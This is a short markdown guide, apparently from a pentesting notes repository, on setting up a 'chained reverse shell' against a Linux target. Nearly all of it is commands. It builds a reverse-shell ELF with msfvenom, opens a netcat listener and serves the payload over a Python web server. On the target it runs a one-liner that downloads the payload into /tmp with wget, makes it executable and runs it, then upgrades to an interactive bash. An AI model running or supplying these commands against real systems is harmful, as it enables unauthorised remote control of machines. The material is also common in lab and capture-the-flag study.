[Back to Main page](README.md)

# Chained Reverse shell

This is a very useful thing to have. This can also be upgraded to a semi-interactive shell.\
**You'll need some way to execute code on the target machine for this**

### How to upgrade your successful Chained reverse shell to a semi-interactive one
- Just paste `python3 -c "import pty; pty.spawn('/bin/bash')"`

## How to do a chained reverse shell

### Choose a port
- Usually `4444` is good and free, but if it isn't, anything free above `1024` will do

### Get an OS shell for your target machine
- Cheat sheat to OS shell generation can be found at
    - [Infinite Logins MSFVenom Cheat Sheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
- In this case it'll be Linux x64, so just create it with msfvenom
    - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP adress> LPORT=<4444 or port that you prefer> -f elf > shell.elf`
- Be sure to fill in **YOUR** IP adress and the port you chose before generating it

### On one terminal, make a listener on the attacking machine
- Just paste this `nc -lvnp <4444 or port that you prefer>`

### On the other terminal, make a python webserver
- Use the command `python3 -m http.server <PORT>`
    - No need to specify a port unless the default, `8000`, is occupied
- The sever should be hosted exactly where the previously generated `shell.elf` is located

### Where you can run code on the target machine, enter the following
- `cd /tmp; rm -f /tmp/shell.elf; wget http://<Your IP>:<8000 or port you chose>/shell.elf; chmod 777 shell.elf; /tmp/shell.elf`
    - For example in a PHP file where you can use `exec`, be smart and use google to find a way

### Find a way to get your code to execute
- Then the target pc should link back to you via Netcat (nc)

### Upgrade / elevate your reverse shell to semi-interactive
- Using the python command provided above